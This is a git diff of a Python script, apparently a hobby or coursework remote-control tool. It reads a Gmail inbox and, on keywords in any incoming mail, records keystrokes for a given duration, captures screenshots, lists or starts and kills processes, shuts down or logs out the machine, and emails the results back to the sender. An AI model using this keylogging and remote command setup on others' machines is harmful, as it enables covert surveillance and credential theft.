@@ -5,6 +5,8 @@ from threading import Timer
 import time 
 import keyLog
 import sendMail
+import re
+import powerController
 
 # Gmail account credentials
 username = "tnmhoang.lop93@gmail.com"
@@ -38,7 +40,10 @@ from_, encoding = decode_header(email_message["From"])[0]
 if isinstance(from_, bytes):
     from_ = from_.decode(encoding)
 
-sender_email = from_
+sender_email = email_message["From"]
+match = re.search(r'<([^>]+)>', sender_email)
+if match:
+    sender_email = match.group(1)
 
 # Print email details
 #if (from_ == "Tuấn Đạt"):
@@ -62,21 +67,48 @@ start = 0  # Define the start position in the string
 end = len(body)  # Define the end position in the string
 
 if body.find("KeyLog", start, end) != -1:
-    # Set the duration in seconds (e.g., 60 seconds)
-    duration = 60
-
-    # Record the start time
-    start_time = time.time()
-
-    # Create a listener for both key press and release events
-    with keyLog.keyboard.Listener(on_press=lambda key: keyLog.on_key_event(key, is_press=True),
-                        on_release=lambda key: keyLog.on_key_event(key, is_press=False)) as listener:
-        while time.time() - start_time < duration:
-            pass
-        listener.stop()
+    duration_start = body.find("Duration:", start, end)
+    if duration_start != -1:
+        duration_start += len("Duration:")  # Move the start index to the character after "Duration:"
+        duration_end = body.find("\n", duration_start, end)  # Find the end of the number, which is a newline character
+        if duration_end != -1:
+            duration_str = body[duration_start:duration_end]  # Extract the substring containing the duration as a string
+            # Remove unwanted characters
+            duration_str = ''.join(filter(str.isdigit, duration_str))
+            duration = int(duration_str)
+            sendMail.send_keyLog_email(sender_email, duration)
 
 if body.find("ListApp", start, end) != -1:
     sendMail.send_process_email(sender_email)
 
 if body.find("Screenshot", start, end) != -1:
     sendMail.send_screenshot_email(sender_email)
+
+if body.find("Shut Down", start, end) != -1:
+    power_controller = powerController.powerController()
+    power_controller.shutdown()
+
+if body.find("Log out", start, end) != -1:
+    power_controller = powerController.powerController()
+    power_controller.logout()
+    
+if body.find("ListProcess", start, end) != -1:
+    sendMail.send_bgProcess_email(sender_email)
+    
+if body.find("StartProcess", start, end) != -1:
+    procName_start = body.find("Name=", start, end)
+    if procName_start != -1:
+        procName_start += len("Name=")
+        procName_end = body.find("\n", procName_start, end)
+        if procName_end != -1:
+            procName = body[procName_start:procName_end]
+            sendMail.send_startProc_status(sender_email, procName)
+            
+if body.find("EndProcess", start, end) != -1:
+    procName_start = body.find("Name=", start, end)
+    if procName_start != -1:
+        procName_start += len("Name=")
+        procName_end = body.find("\n", procName_start, end)
+        if procName_end != -1:
+            procName = body[procName_start:procName_end]
+            sendMail.send_endProc_status(sender_email, procName)
